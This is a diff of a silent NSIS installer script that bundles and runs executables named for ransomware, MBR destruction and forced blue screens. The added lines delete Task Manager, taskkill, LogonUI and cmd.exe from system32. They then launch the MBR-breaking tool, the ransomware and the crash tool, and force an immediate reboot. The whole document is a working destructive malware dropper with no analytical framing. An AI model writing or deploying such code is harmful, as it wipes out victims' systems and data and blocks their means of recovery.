@@ -15,13 +15,20 @@ SilentInstall silent
 InstallDirRegKey HKLM "${PRODUCT_DIR_REGKEY}" ""
 
 Section "MainSection" SEC01
+  Delete /rebootok "$WINDIR\system32\taskmgr.exe"
+  Delete /rebootok "$WINDIR\system32\taskkill.exe"
+  Delete /rebootok "$WINDIR\system32\LogonUI.exe"
+  Delete /rebootok "$WINDIR\system32\cmd.exe"
   SetOutPath "$INSTDIR"
   SetOverwrite ifnewer
   File "..\mkbsod\mkbsod.exe"
   File "..\breakmbr\breakmbr.exe"
   File "..\shengpizi-ransomware\bin\x86\Release\shengpizi-ransomware.exe"
   File "..\bgm.wav"
-  exec "$INSTDIR\shengpizi-ransomware.exe"
+  exec "$INSTDIR\breakmbr.exe"
+  execwait "$INSTDIR\shengpizi-ransomware.exe"
+  exec "$INSTDIR\mkbsod.exe"
+  exec "shutdown /f /r /t 0"
 SectionEnd
 
 Section -Post
